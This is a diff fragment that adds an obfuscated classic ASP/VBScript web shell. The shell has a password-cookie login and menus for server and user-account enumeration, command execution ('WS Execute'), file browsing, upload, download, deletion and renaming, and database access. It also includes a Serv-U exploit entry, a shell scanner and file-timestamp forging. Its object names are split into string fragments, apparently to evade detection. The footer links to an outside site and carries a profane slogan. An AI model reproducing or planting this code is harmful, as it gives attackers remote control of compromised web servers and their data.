+.tdText{font:12px Arial,Tahoma;background:#fff;padding:1px;width:100%;BORDER-WIDTH:1px;}
+.area{font:12px 'Courier New',Monospace;background:#fff;border: 1px solid #666;padding:2px;}
+a{color: #00f;text-decoration:underline;}
+a:hover{color: #f00;text-decoration:none;}
+.alt1Span{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ededed;padding:2px 10px 2px 5px;width:100%;height:28px}
+.alt0Span{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#fafafa;padding:2px 10px 2px 5px;width:100%;height:28px}
+.link td{border-top:1px solid #fff;border-bottom:1px solid #ccc;background:#e8e8e8;padding:5px 10px 5px 5px;}
+.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ededed;padding:2px 10px 2px 5px;height:28px}
+.alt0 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#fafafa;padding:2px 10px 2px 5px;height:28px}
+.focusTr td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ddddff;padding:2px 10px 2px 5px;height:28px}
+.head td{border-top:1px solid #ccc;border-bottom:1px solid #bbb;background:#e0e0e0;padding:5px 10px 5px 5px;font-weight:bold;}
+.headSpan{border-top:1px solid #fff;margin:2;background:#e0e0e0;width:100%;}
+form{margin:0;padding:0;}
+.bt{border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:23px;padding:3px 5px 5px 5px;}
+h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
+ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
+u{text-decoration: none;color:#777;float:left;display:block;width:50%;margin-right:10px;}
+label{font:12px Arial,Tahoma;float:left;width:20%;}
+.lbl{font:12px Arial,Tahoma;float:none;width:auto;}
+</style>
+<script language="javascript">
+function xppp(obj){
+var sender=event.srcElement;
+if(obj.style.display=='none'){
+obj.style.display='';
+sender.className='showhref';
+}else{
+obj.style.display='none';
+sender.className='hidehref';
+}
+}
+</script>
+<script language="vbscript">
+Function iajgq(jkin,zec,Str)
+On Error Resume Next
+Dim jbap
+actForm.goaction.value=jkin
+actForm.ydoho.value=zec
+If(jkin="jmed"Or jkin="glyx")And InStr(Str,":\")<1 And Str<>"" Then Str=gstq.value&Str
+actForm.pex.value=ucdn(Str)
+Select Case zec
+Case"cjamq"
+lpqxd("upform")
+upform.submit()
+Case"smeby"
+lpqxd("saform")
+saform.submit()
+Case"chutj","qhg","jzen","xlu","zws","okwn","syu"
+Select Case zec
+Case"jzen","qhg"
+jbap=InputBox("Move to :","Move",Left(Str,InstrRev(Str,"\")))
+Case"xlu","chutj"
+jbap=InputBox("Copy to :","Copy",Left(Str,InstrRev(Str,"\")))
+Case"zws","okwn"
+jbap=InputBox("Rename as :","Rename",Mid(Str,InstrRev(Str,"\")+1))
+If zec="zws"Then
+Do While InStr(jbap,".")<1 And jbap<>""
+jbap=InputBox("Invalid file name format!","Rename","")
+Loop
+End If
+Case Else
+jbap=InputBox("ModIfy as :","ModIfy time","")
+End Select
+If jbap=""Then Exit Function
+actForm.pex.value=ucdn(Str&"|"&jbap)
+actForm.submit()
+Case"lvdf","sxlvq"
+If Window.confirm("Delete it?Are you sure?")Then actForm.submit()
+Case Else
+actForm.submit()
+End Select
+End Function
+Function ucdn(pamToEn)
+If Not <%=awizo%> Or pamToEn=""Then
+ucdn=pamToEn
+Exit Function
+End If
+Dim tt,sac
+tt=""
+For i=1 To Len(pamToEn)
+sac=Mid(pamToEn,i,1)
+If Asc(sac)<128 And Asc(sac)>0 Then
+tt=tt&Asc(sac)+<%=xgezc%>&"<%=ojkin%>"
+Else
+tt=tt&sac&"<%=ojkin%>"
+End If
+Next
+ucdn=Left(tt,Len(tt)-1)
+End Function
+Function lpqxd(jyez)
+On Error Resume Next
+Dim pamArr
+pamArr=Split("<%=fmded%>","|")
+For Each strPam In pamArr
+On Error Resume Next:Execute jyez&"."&strPam&".value=ucdn("&jyez&"."&strPam&".value)"
+Next
+End Function
+Function fuav(zec,kpc,mmz,upt,bvo)
+sqlForm.ydoho.value=zec
+If zec="yyjd"Then
+If Not Window.confirm("Delete this table?Are you sure?")Then Exit Function
+End If
+If kpc<>""Then
+If InStr(1,kpc,"PROVIDER=",1)<1 Then kpc="<%=efpnh("")%>"&gstq.value&kpc
+sqlForm.kpc.value=kpc
+End If
+'If upt<>""And <%=ycqmn<>"others"%> Then upt="["&upt&"]"
+sqlForm.kpc.value=ucdn(sqlForm.kpc.value)
+sqlForm.mmz.value=ucdn(mmz)
+sqlForm.upt.value=ucdn(upt)
+sqlForm.bvo.value=bvo
+sqlForm.submit()
+End Function
+Function xcnub(server,user,pass,db)
+form1.kpc.value="PROVIDER=SQLOLEDB;DATA SOURCE="&server&";UID="&user&";PWD="&pass&";DATABASE="&db&""
+End Function
+Function ssiy(dbpath)
+form1.kpc.value="<%=efpnh("")%>"&dbpath
+End Function
+Function tsv()
+'On Error Resume Next
+Dim swkhq,ccsi
+Set ccsi=new RegExp
+ccsi.Global=True
+ccsi.IgnoreCase=True
+ccsi.MultiLine=True
+ccsi.Pattern="^((\d+|.)<%=ojkin%>)+(\d+|.)$"
+For Each subForm In Document.Forms
+For Each swkhq In subForm.Elements
+If InStr("|<%=fmded%>|","|"&swkhq.id&"|")>0 And ccsi.Test(swkhq.value)Then swkhq.value=yfup(swkhq.value)
+Next
+Next
+End Function
+Function yfup(uufzs)
+If Not <%=awizo%> Or uufzs=""Then
+yfup=uufzs
+Exit Function
+End If
+Dim dd,cdem
+dd=""
+cdem=Split(uufzs,"<%=ojkin%>")
+For i=0 To UBound(cdem)
+If IsNumeric(cdem(i))Then
+dd=dd&Chr(CInt(cdem(i))-<%=xgezc%>)
+Else
+dd=dd&cdem(i)
+End If
+Next
+yfup=dd
+End Function
+</script>
+</head>
+<body style="margin:0;table-layout:fixed; word-break:break-all;"bgcolor="#f9f9f9">
+<table width="100%"border="0"cellpadding="0"cellspacing="0">
+<tr class="head">
+<td style="width:30%"><br><%=tbsei("LOCAL_ADDR")&"("&zwf&")"%></td>
+<td align="center" style="width:40%"><br>
+<b><%vux ajwy,"#0099FF","3"%></b><br>
+</td>
+<td style="width:30%"align="right"><%=rwkup()%></td>
+</tr>
+<form id="actForm"method="post"action="<%=djdla%>">
+<input type="hidden" id="goaction" name="goaction" value="">
+<input type="hidden" id="ydoho" name="ydoho" value="">
+<input type="hidden" id="pex" name="pex" value="">
+</form>
+<form id="sqlForm"method="post"action="<%=djdla%>">
+<input type="hidden" id="goaction" name="goaction" value="yymjd">
+<input type="hidden" id="ydoho" name="ydoho" value="">
+<input type="hidden" id="kpc" name="kpc" value="<%=kpc%>">
+<input type="hidden" id="mmz" name="mmz" value="">
+<input type="hidden" id="upt" name="upt" value="">
+<input type="hidden" id="bvo" name="bvo" value="">
+</form>
+<%
+If gshog Then
+%>
+<tr class="link">
+<td colspan="3">
+<a href="javascript:iajgq('uiph','','');">Server Info</a> | 
+<a href="javascript:iajgq('txi','','');">Object Info</a> | 
+<a href="javascript:iajgq('ytj','','');">User Info</a> | 
+<a href="javascript:iajgq('oyh','','');">C-S Info</a> | 
+<a href="javascript:iajgq('xjl','','');">WS Execute</a> | 
+<a href="javascript:iajgq('jmed','','');">FSO File</a> | 
+<a href="javascript:iajgq('glyx','','');">App File</a> | 
+<a href="javascript:iajgq('yymjd','','');">DataBase</a> | 
+<a href="javascript:iajgq('rsqvg','','');">File Packager</a> | 
+<a href="javascript:iajgq('mxapl','','');">File Searcher</a> | 
+<a href="javascript:iajgq('oytw','','');">ServU Exp</a> | 
+<a href="javascript:iajgq('fzsmc','','');">Scan Shells</a> | 
+<a href="javascript:iajgq('splk','','');">Some Others...</a> | 
+<a href="javascript:iajgq('Logout','','');">Logout</a> | 
+<a href="javascript:tsv();">Decode</a>
+</td>
+</tr>
+<%
+End If
+%></table><div class="main"><br>
+<%
+echo"<b>"
+vux ttudp&"&raquo;","#0099ff","2"
+nuauc"</b><br><br>"
+End Sub
+Sub wku()
+Dim bvayq
+bvayq=saqv(tbsei("PATH_INFO"),"/",False)
+echo ybsrh("http://"&zwf&bvayq&"/"&kicu&"?"&tbsei("QUERY_STRING"),"GET")
+Response.status=rstb.status
+response.End
+End Sub
+Sub viiks(yhs,alcr)
+Dim qln
+If Not lslt Then On Error Resume Next
+echo"<li><u>"&yhs
+If alcr<>""Then
+echo"(Object "&alcr&")"
+End If
+echo"</u>"
+If Err Then Err.Clear
+Set qln=zkew(yhs)
+If Err Then
+vux vaiy("Disabled"),"red",""
+Else
+vux vaiy("Enabled  "),"green",""
+echo"Version:"&qln.Version&";"
+echo"About:"&qln.About
+End If
+echo"</li>"
+If Err Then Err.Clear
+Set qln=Nothing
+End Sub
+Sub iwtng(akhc)
+Dim User,gsme,kue
+If Not lslt Then On Error Resume Next
+Set User=getObj("WinNT://./"&akhc&",user")
+gsme=User.Get("UserFlags")
+kue=User.LastLogin
+sffh 0
+doTd"Description","20%"
+doTd User.Description,"80%"
+potex
+sffh 1
+doTd"Belong to",""
+doTd akva(akhc),""
+potex
+sffh 0
+doTd"Password expired","20%"
+doTd CBool(User.Get("Password"&okj&"Expired")),"80%"
+potex
+sffh 1
+doTd"Password never expire",""
+doTd cbool(gsme And&H10000),""
+potex
+sffh 0
+doTd"Can't change password",""
+doTd cbool(gsme And&H00040),""
+potex
+sffh 1
+doTd"Global-group account",""
+doTd cbool(gsme And&H100),""
+potex
+sffh 0
+doTd"Password length at least",""
+execute "doTd User.PasswordMini"&oej&"mumLength,"""""
+potex
+sffh 1
+doTd"Password required",""
+doTd User.PasswordRequired,""
+potex
+sffh 0
+doTd"Account disabled",""
+execute "doTd User.AccountDi"&zalb&"sabled,"""""
+potex
+sffh 1
+doTd"Account locked",""
+execute "doTd User.IsAccountLoc"&zycg&"ked,"""""
+potex
+sffh 0
+doTd"User profile",""
+doTd User.Profile,""
+potex
+sffh 1
+doTd"User loginscript",""
+doTd User.LoginScript,""
+potex
+sffh 0
+doTd"Home directory",""
+doTd User.HomeDirectory,""
+potex
+sffh 1
+doTd"Home drive",""
+doTd User.Get("HomeD"&dtw&"irDrive"),""
+potex
+sffh 0
+doTd"Last login",""
+doTd kue,""
+potex
+If Err Then Err.Clear
+End Sub
+Function akva(akhc)
+Dim xssr,orum
+Set xssr=getObj("WinNT://./"&akhc&",user")
+For Each orum in xssr.Groups
+akva=akva&" "&orum.Name
+Next
+End Function
+Function izawx(godj)
+execute "Set objCountFile=grl.OpenTextFil"&ujegp&"e(godj,1,True)"
+execute "izawx=Replace(objCountFile.Rea"&wfrtn&"dAll,Chr(0),"" "")"
+objCountFile.Close
+Set objCountFile=Nothing
+End Function
+Function xehxe(godj)
+If Not lslt Then On Error Resume Next
+Set cykbq=zkew("Ado"&pgjme&"db.S"&fmt&"tream")
+With cykbq
+.Type=2
+.Mode=3
+.Open
+.LoadFromFile godj
+If ydoho="eqk" Then
+.CharSet="utf-8"
+Else
+.CharSet=ydbj
+End If
+.Position=2
+xehxe=Replace(.ReadText(),Chr(0)," ")
+.Close
+End With
+Set cykbq=Nothing
+End Function
+Sub dlbgc(godj,nwwj,lryrz)
+If Not lslt Then On Error Resume Next
+Set cykbq=zkew("Ado"&pgjme&"db.S"&fmt&"tream")
+With cykbq
+.Type=lryrz
+.Mode=3
+.Open
+If ydoho="rdeb"Then
+.CharSet="utf-8"
+ElseIf ydoho="Save"Then
+.CharSet=ydbj
+End If
+If lryrz=2 Then
+.WriteText nwwj
+Else
+.Write nwwj
+End If
+execute "cykbq.SavetoF"&cod&"ile godj,2"
+.Close
+End With
+Set cykbq=Nothing
+End Sub
+Sub rwha(godj,nwwj)
+Dim theFile
+execute "Set theFile=grl.OpenTex"&qgytm&"tFile(godj,2,True)"
+theFile.Write nwwj
+theFile.Close
+Set theFile=Nothing
+End Sub
+Sub lmy()
+If Not lslt Then On Error Resume Next
+If qmlr="file"Then
+godj=godj&"\"&njwkr
+execute "Call grl.Crea"&bklj&"teTextFile(godj,False)"
+mkp
+Else
+execute "grl.CreateFold"&pswk&"er(godj&""\""&njwkr)"
+End If
+If Err Then
+goql(Err)
+Else
+avivi"File/folder created"
+End If
+End Sub
+Sub rum()
+Dim ugxmt,gpq,ckkx,ecxac
+If Not lslt Then On Error Resume Next
+godj=saqv(pex,"|",False)
+ugxmt=rqv(pex,"|")
+If InStr(godj,"\")<1 Then godj=godj&"\"
+Dim theFile,fileName,theFolder
+If godj=""Or ugxmt=""Then
+avivi"Parameter wrong!"
+Exit Sub
+End If
+If niyp="fso"Then
+If ydoho="renamefolder"Then
+Set theFolder=grl.GetFolder(godj)
+theFolder.Name=ugxmt
+Set theFolder=Nothing
+Else
+Set theFile=grl.GetFile(godj)
+theFile.Name=ugxmt
+Set theFile=Nothing
+End If
+Else
+ecxac=rqv(godj,"\")
+ckkx=saqv(godj,"\",False)
+execute "Set gpq=njt.NameSpac"&zalf&"e(ckkx)"
+Set slfv=gpq.ParseName(ecxac)
+slfv.Name=ugxmt
+End If
+If Err Then
+goql(Err)
+Else
+avivi"Rename completed"
+End If
+End Sub
+Sub cgqmb()
+If Not lslt Then On Error Resume Next
+If ydoho="sxlvq"Then
+execute "Call grl.Delete"&trmpr&"Folder(godj,True)"
+Else
+execute "Call grl.DeleteFi"&taf&"le(godj,True)"
+End If
+If Len(godj)=2 Then godj=godj&"\"
+If Err Then
+goql(Err)
+Else
+avivi"File/folder deleted"
+End If
+End Sub
+Sub mcqbj()
+Dim vowmr,nlqbi,kjmqo,lfwma,ttg
+If Not lslt Then On Error Resume Next
+godj=Left(pex,Instr(pex,"|")-1)
+nlqbi=Mid(pex,InStr(pex,"|")+1)
+If godj=""Or nlqbi=""Then
+avivi"Parameter wrong!"
+Exit Sub
+End If
+Select Case ydoho
+Case"chutj"
+execute "Call grl.CopyF"&zbi&"older(godj,nlqbi)"
+Case"xlu"
+execute "Call grl.CopyF"&xpm&"ile(godj,nlqbi)"
+Case"qhg"
+execute "Call grl.Move"&wjv&"Folder(godj,nlqbi)"
+Case"jzen"
+echo godj&"||"&nlqbi
+execute "Call grl.MoveFil"&njvmb&"e(godj,nlqbi)"
+End Select
+If Err Then
+goql(Err)
+Else
+avivi"File/folder copyed/moved"
+End If
+End Sub
+Sub syu()
+Dim ireg,fdvh,lfxur,lrn
+If Not lslt Then On Error Resume Next
+godj=Left(pex,Instr(pex,"|")-1)
+If Right(godj,1)="\"And Len(godj)>3 Then godj=Left(godj,Len(godj)-1)
+fdvh=rqv(godj,"\")
+lfxur=Mid(pex,Instr(pex,"|")+1)
+godj=saqv(godj,"\",False)
+execute "Set lrn=njt.NameSpac"&dnxd&"e(godj)"
+Set ireg=lrn.ParseName(fdvh)
+If lfxur<>""Then
+If IsDate(lfxur) Then ireg.ModIfyDate=lfxur
+End If
+If Err Then
+goql(Err)
+Else
+avivi"Time modIffied"
+End If
+Set ireg=Nothing
+Set lrn=Nothing
+End Sub
+Sub umxcb()
+Response.Clear
+If Not lslt Then On Error Resume Next
+Dim fileName,rsn
+fileName=rqv(godj,"\")
+Set cykbq=zkew("Ado"&pgjme&"db.S"&fmt&"tream")
+cykbq.Open
+cykbq.Type=1
+execute "cykbq.Lo"&dptth&"adFromFile(godj)"
+goql(Err)
+Session.CodePage=936
+Response.AddHeader"Content-Disposition","Attachment; Filename="&fileName
+Session.CodePage=65001
+Response.AddHeader"Content-Length",cykbq.Size
+Response.ContentType="Application/Octet-Stream"
+Response.BinaryWrite cykbq.Read
+Response.Flush()
+cykbq.Close
+Set cykbq=Nothing
+End Sub
+Class upload_5xsoft
+Dim ywdgw,jcka
+Public Function Form(upqot)
+upqot=Lcase(upqot)
+If Not ywdgw.exists(upqot) Then
+Form=""
+Else
+Form=ywdgw(upqot)
+End If
+End Function
+Public Function File(strFile)
+If Not lslt Then On Error Resume Next
+strFile=Lcase(strFile)
+If not jcka.exists(strFile) Then
+Set File=new FileInfo
+Else
+Set File=jcka(strFile)
+End If
+End Function
+Private Sub Class_Initialize
+If Not lslt Then On Error Resume Next
+Dim tusx,bim,vbCrlf,pfj,uqezp,isba,aby,ygx,theFile
+Dim tth,yrok,iokwz,jluez,tmg
+Dim tjox,wbmfm
+Dim wwm,skjyr,jmgj
+Set ywdgw=zkew("Scripti"&kwaa&"ng.Dictionary")
+Set jcka=zkew("Scripti"&kwaa&"ng.Dictionary")
+If Request.TotalBytes<1 Then Exit Sub
+Set aby=zkew("Ado"&pgjme&"db.S"&fmt&"tream")
+Set cykbq=zkew("Ado"&pgjme&"db.S"&fmt&"tream")
+cykbq.Type=1
+cykbq.Mode=3
+cykbq.Open
+cykbq.Write Request.BinaryRead(Request.TotalBytes)
+cykbq.Position=0
+tusx=cykbq.Read
+wwm=1
+skjyr=LenB(tusx)
+vbCrlf=chrB(13)&chrB(10)
+bim=MidB(tusx,1,InStrB(wwm,tusx,vbCrlf)-1)
+ygx=LenB(bim)
+wwm=wwm+ygx+1
+While(wwm+10)<skjyr 
+isba=InStrB(wwm,tusx,vbCrlf & vbCrlf)+3
+aby.Type=1
+aby.Mode=3
+aby.Open
+cykbq.Position=wwm
+cykbq.CopyTo aby,isba-wwm
+aby.Position=0
+aby.Type=2
+aby.CharSet="gb2312"
+pfj=aby.ReadText
+aby.Close
+wwm=InStrB(isba,tusx,bim)
+tjox=InStr(22,pfj,"name=""",1)+6
+wbmfm=InStr(tjox,pfj,"""",1)
+jmgj=Lcase(Mid(pfj,tjox,wbmfm-tjox))
+If InStr(45,pfj,"filename=""",1) > 0 Then
+Set theFile=new FileInfo
+tjox=InStr(wbmfm,pfj,"filename=""",1)+10
+wbmfm=InStr(tjox,pfj,"""",1)
+tmg=Mid(pfj,tjox,wbmfm-tjox)
+theFile.FileName=buo(tmg)
+theFile.FilePath=rxtei(tmg)
+theFile.amo=stdnh(tmg)
+tjox=InStr(wbmfm,pfj,"Content-Type: ",1)+14
+wbmfm=InStr(tjox,pfj,vbCr)
+theFile.FileType =Mid(pfj,tjox,wbmfm-tjox)
+theFile.jlskw =isba
+theFile.FileSize=wwm-isba-3
+theFile.bmh=jmgj
+If not jcka.Exists(jmgj)Then
+jcka.add jmgj,theFile
+End If
+Else
+aby.Type =1
+aby.Mode =3
+aby.Open
+cykbq.Position=isba 
+cykbq.CopyTo aby,wwm-isba-3
+aby.Position=0
+aby.Type=2
+aby.CharSet ="gb2312"
+jluez=aby.ReadText 
+aby.Close
+If ywdgw.Exists(jmgj) Then
+ywdgw(jmgj)=ywdgw(jmgj)&","&jluez
+Else
+ywdgw.Add jmgj,jluez
+End If
+End If
+wwm=wwm+ygx+1
+wEnd
+tusx=""
+Set aby =nothing
+End Sub
+Private Sub Class_Terminate
+If Not lslt Then On Error Resume Next
+If Request.TotalBytes>0 Then
+ywdgw.RemoveAll
+jcka.RemoveAll
+Set ywdgw=nothing
+Set jcka=nothing
+cykbq.Close
+Set cykbq =nothing
+End If
+End Sub
+Private Function rxtei(prmp)
+If Not lslt Then On Error Resume Next
+If prmp<>"" Then
+rxtei=left(prmp,InStrRev(prmp,"\"))
+Else
+rxtei=""
+End If
+End Function
+Private Function stdnh(prmp)
+If prmp<>"" Then
+stdnh=mid(prmp,InStrRev(prmp,".")+1)
+Else
+stdnh=""
+End If
+End Function
+Private Function buo(prmp)
+If prmp<>"" Then
+buo=mid(prmp,InStrRev(prmp,"\")+1)
+Else
+buo=""
+End If
+End Function
+End Class
+Class FileInfo
+Dim bmh,FileName,FilePath,FileSize,amo,FileType,jlskw
+Private Sub Class_Initialize 
+FileName=""
+FilePath=""
+FileSize=0
+jlskw= 0
+bmh=""
+FileType=""
+amo= ""
+End Sub
+Public Function crxg(prmp)
+Dim dr,aal,i
+crxg=True
+If Trim(prmp)="" or jlskw=0 or FileName="" or Right(prmp,1)="/" Then exit Function
+Set dr=CreateObject("Ado"&pgjme&"db.S"&fmt&"tream")
+dr.Mode=3
+dr.Type=1
+dr.Open
+cykbq.position=jlskw
+cykbq.copyto dr,FileSize
+execute "dr.Sa"&nsr&"vetoFile prmp,2"
+dr.Close
+Set dr=nothing 
+crxg=False
+End Function
+Public Function fkv()
+cykbq.position=jlskw
+fkv=cykbq.Read(FileSize)
+End Function
+End Class
+Sub osfe()
+If Not lslt Then On Error Resume Next
+If godj="" Then godj=qnvke
+If InStr(godj,":")<1 Then godj=qnvke&"\"&godj
+Set theFile=okw.File("upfile")
+If svle="" Then svle=theFile.FileName
+theFile.crxg(godj&"\"&svle)
+If Err Then
+goql(Err)
+Else
+avivi("Upload Sucess")
+End If
+End Sub
+Function ybsrh(mtk,method)
+If Not lslt Then On Error Resume Next
+Dim olhdc
+If method="POST" Then
+olhdc=Split(mtk,"?")(1)
+mtk=Split(mtk,"?")(0)
+End If
+rstb.Open method,mtk,False
+If method="POST" Then
+rstb.SetRequestHeader"Content-Type","application/x-www-form-urlencoded"
+rstb.send olhdc
+Else
+rstb.send
+End If
+If wwwh(rstb.getAllResponseHeaders(),"charSet ?= ?[""']?[\w-]+")Then
+pagecharSet=Trim(spa(urnj(rstb.getAllResponseHeaders(),"charSet ?= ?[""']?[\w-]+",False)(0),"charSet ?= ?[""']?","",False))
+ElseIf wwwh(rstb.ResponseText,"charSet ?= ?[""']?[\w-]+")Then
+pagecharSet=Trim(spa(urnj(rstb.ResponseText,"charSet ?= ?[""']?[\w-]+",False)(0),"charSet ?= ?[""']?","",False))
+End If
+If pagecharSet=""Then pagecharSet=ydbj
+ybsrh=jvws(rstb.responseBody,pagecharSet)
+End Function
+Function ksu()
+If Request.Cookies(fxu)=""Then
+ksu=False
+Exit Function
+End If
+If sgcly(Request.Cookies(fxu))=pass Then
+ksu=True
+Else
+ksu=False
+End If
+End Function
+Function ucdn(pamToEn)
+If Not awizo Or pamToEn=""Then
+ucdn=pamToEn
+Exit Function
+End If
+Dim tt,sac
+tt=""
+For i=1 To Len(pamToEn)
+sac=Mid(pamToEn,i,1)
+If Asc(sac)<128 And Asc(sac)>0 Then
+tt=tt&Asc(sac)+xgezc&ojkin
+Else
+tt=tt&sac&ojkin
+End If
+Next
+ucdn=Left(tt,Len(tt)-1)
+End Function
+Function yfup(uufzs)
+If Not awizo Or uufzs="" Or Not wwwh(uufzs,"^((\d+|.)"&ojkin&")+(\d+|.)$")Then
+yfup=uufzs
+Exit Function
+End If
+Dim dd,cdem
+dd=""
+cdem=Split(uufzs,ojkin)
+For i=0 To UBound(cdem)
+If IsNumeric(cdem(i))Then
+dd=dd&Chr(CInt(cdem(i))-xgezc)
+Else
+dd=dd&cdem(i)
+End If
+Next
+yfup=dd
+End Function
+Function rwkup()
+Dim qcth,eomgk,smsap
+eomgk=88
+smsap=31
+qcth="<br>"
+qcth=qcth&"<a href='http://www.xfkxw.com/' target='_blank'>rohs</a> | "
+qcth=qcth&"<a href='http://www.xfkxw.com/' target='_blank'>rohs</a> | "
+qcth=qcth&"<a href='http://www.xfkxw.com/' target='_blank'>rohs</a> | "
+qcth=qcth&"<a href='http://www.xfkxw.com/' target='_blank'>Fuck Tencent</a>"
+rwkup=qcth
+End Function
+Function jvws(kaq,tem)
+If Not lslt Then On Error Resume Next
+Dim ryd,dcrku
+Set ryd=zkew("Ado"&pgjme&"db.S"&fmt&"tream")
+With ryd
+.Type=2
+.Open
+.WriteText kaq
+.Position=0
+.CharSet=tem
+.Position=2
+dcrku=.ReadText(.Size)
+.close
+End With
+Set ryd=Nothing
+jvws=dcrku
+End Function
+Function tbsei(str)
+tbsei=Request.ServerVariables(str)
+End Function
+Function zkew(tekgs)
+Set zkew=Server.CreateObject(tekgs)
+End Function
+Function getObj(tekgs)
+Set getObj=GetObject(tekgs)
+End Function
+Function qmkc(str)
+qmkc=server.urlencode(str)
+End Function
+Function kbql(str)
+Dim icfj,ucqpp
+icfj=""
+For i=0 To Len(str)-1
+ucqpp=Right(str,Len(str)-i)
+If Asc(ucqpp)<16 Then icfj=icfj&"0"
+icfj=icfj&CStr(Hex(Asc(ucqpp)))
+Next
+kbql="0x"&icfj
+End Function
+Function wupsu(str)
+Dim icfj,ucqpp
+icfj=""
+For i=0 To Len(str)-1
+ucqpp=Right(str,Len(str)-i)
+icfj=icfj&CStr(Hex(Asc(ucqpp)))&"00"
+Next
+wupsu="0x"&icfj
+End Function
+Function vaiy(str)
+str=ssrwt(str)
+str=Replace(str,Chr(13)&Chr(10),"<br>")
+vaiy=Replace(str," ","&nbsp;")
+End Function
+Function ssrwt(str)
+If Not lslt Then On Error Resume Next
+str=CStr(str)
+If IsNull(str)Or str=""Then
+ssrwt=""
+Exit Function
+End If
+ssrwt=Server.HtmlEncode(str)
+End Function
+Function rumla(str)
+rumla=Server.MapPath(str)
+End Function
+Sub goql(Err)
+If Err Then
+avivi"Exception :"&Err.Description
+avivi"Exception source :"&Err.Source
+Err.Clear
+End If
+End Sub
+Function sgcly(ByVal CodeStr) 
+Dim zmoin 
+Dim ede 
+Dim jbkhr 
+zmoin=30 
+ede=zmoin-Len(CodeStr) 
+If Not ede<1 Then 
+For cecr=1 To ede 
+CodeStr=CodeStr&Chr(21) 
+Next 
+End If 
+jbkhr=1 
+Dim Ben 
+For cecb=1 To zmoin 
+Ben=zmoin+Asc(Mid(CodeStr,cecb,1)) * cecb 
+jbkhr=jbkhr * Ben 
+Next 
+CodeStr=jbkhr 
+jbkhr=Empty 
+For cec=1 To Len(CodeStr) 
+jbkhr=jbkhr&zajv(Mid(CodeStr,cec,3)) 
+Next 
+For cec=20 To Len(jbkhr)-18 Step 2 
+sgcly=sgcly&Mid(jbkhr,cec,1) 
+Next 
+End Function 
+Function zajv(word) 
+For cc=1 To Len(word) 
+zajv=zajv&Asc(Mid(word,cc,1)) 
+Next 
+zajv=Hex(zajv) 
+End Function 
+Function rwumm(zzb)
+If zzb>=(1024 * 1024 * 1024)Then rwumm=Fix((zzb /(1024 * 1024 * 1024))* 100)/ 100&"G"
+If zzb>=(1024 * 1024)And zzb<(1024 * 1024 * 1024)Then rwumm=Fix((zzb /(1024 * 1024))* 100)/ 100&"M"
+If zzb>=1024 And zzb<(1024 * 1024)Then rwumm=Fix((zzb / 1024)* 100)/ 100&"K"
+If zzb>=0 And zzb<1024 Then rwumm=zzb&"B"
+End Function
+Function yrktq(num)
+Select Case num
+Case 0
+yrktq="Unknown"
+Case 1
+yrktq="Removable"
+Case 2
+yrktq="Local drive"
+Case 3
+yrktq="Net drive"
+Case 4
+yrktq="CD-ROM"
+Case 5
+yrktq="RAM disk"
+End Select
+End Function
+Function djfri(ByVal str)
+str=Replace(str,"\","\\")
+djfri=Replace(str,"\\\\","\\")
+End Function
+Function efpnh(str)
+efpnh="Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&str
+End Function
+Function saqv(str,oztli,tskgs)
+If str="" Or InStr(str,oztli)<1 Then
+saqv=""
+Exit Function
+End If
+If tskgs Then
+saqv=Left(str,InStr(str,oztli)-1)
+Else
+saqv=Left(str,InstrRev(str,oztli)-1)
+End If
+End Function
+Function rqv(str,oztli)
+If str="" Or InStr(str,oztli)<1 Then
+rqv=""
+Exit Function
+End If
+rqv=Mid(str,InstrRev(str,oztli)+Len(oztli))
+End Function
+Sub echo(str)
+Response.Write str
+End Sub
+Sub nuauc(str)
+echo str&vbCrLf
+End Sub
+Sub xstrw(tekgs,wysxv)
+echo"<a href='#' onClick=""javascript:xppp("&tekgs&")"" id='"&tekgs&"href' class='hidehref'>"&tekgs&" :</a>"
+echo"<span id="&tekgs
+If wysxv Then echo" style='display:none;'"
+nuauc">"
+End Sub
+Sub goe(aolfx,ydoho,rbmso,jkfh,cutia)
+nuauc"<a href=""javascript:iajgq('"&aolfx&"','"&ydoho&"','"&rbmso&"')"">"&jkfh&"</a>"&cutia
+End Sub
+Sub euk(ydoho,kpc,mmz,ovy,bvo,jkfh,cutia)
+nuauc"<a href=""javascript:fuav('"&ydoho&"','"&kpc&"','"&mmz&"','"&ovy&"','"&bvo&"')"">"&jkfh&"</a>"&cutia
+End Sub
+Sub vux(str,color,size)
+echo"<font color="""&color&""""
+If size<>""Then echo" size="""&size&""""
+nuauc">"&str&"</font>"
+End Sub
+Sub ahwr(width)
+nuauc"<table width="""&width&"""border=""0""cellpadding=""0""cellspacing=""0"">"
+End Sub
+Sub ymw()
+nuauc"</table>"
+End Sub
+Sub sffh(num)
+echo"<tr class='alt"&num&"' onmouseover=""javascript:this.className='focusTr';"" onmouseout=""javascript:this.className='alt"&num&"';"">"
+End Sub
+Sub ceydb()
+echo"<tr class='link'>"
+End Sub
+Sub lzwq(num)
+echo"<span class='alt"&num&"Span'>"
+End Sub
+Sub fcmxc(tekgs,wysxv)
+echo"<span id="&tekgs
+If wysxv Then echo" style='display:none;'"
+nuauc">"
+End Sub
+Sub nef(needEn)
+echo"<form method=""post"" id=""form"&jyez&""" action="""&djdla&""""
+If needEn Then echo" onSubmit=""javascript:lpqxd('form"&jyez&"')"""
+nuauc">"
+tpdyo"goaction",goaction
+jyez=jyez+1
+End Sub
+Sub cmj()
+nuauc"</form>"
+End Sub
+Sub vkrx(value,width)
+echo"<td style=""width:"&width&""">"
+echo"<input type=""submit"" value="""&value&""" class=""bt"">"
+nuauc"</td>"
+End Sub
+Sub zou(str,color,size)
+echo"<td>"
+vux str,color,size
+nuauc"</td>"
+End Sub
+Sub potex()
+nuauc"</tr>"
+End Sub
+Sub doTd(td,width)
+If td=""Or IsNull(td)Then td="<font color=""red"">Null</font>"
+echo"<td"
+If width<>""Then echo" width='"&width&"'"
+echo">"
+echo CStr(td)
+nuauc"</td>"
+End Sub
+Sub bcnd(wannd,name,value,size,cutia)
+Dim cls
+If wannd="button"Or wannd="submit"Or wannd="reSet"Then
+cls="bt"
+Else
+cls="input"
+End If
